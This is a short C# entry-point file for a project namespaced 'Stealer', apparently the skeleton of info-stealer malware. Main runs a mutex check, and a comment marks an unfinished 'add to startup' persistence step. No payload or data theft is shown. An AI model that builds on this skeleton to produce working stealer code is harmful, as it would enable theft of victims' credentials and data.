using System;

namespace Stealer
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThreadAttribute]
        static void Main()
        {
            // Check mutex
            Modules.AppMutex.Check();
            // Add to startup
            //if (!Modules.)

        }
    }
}
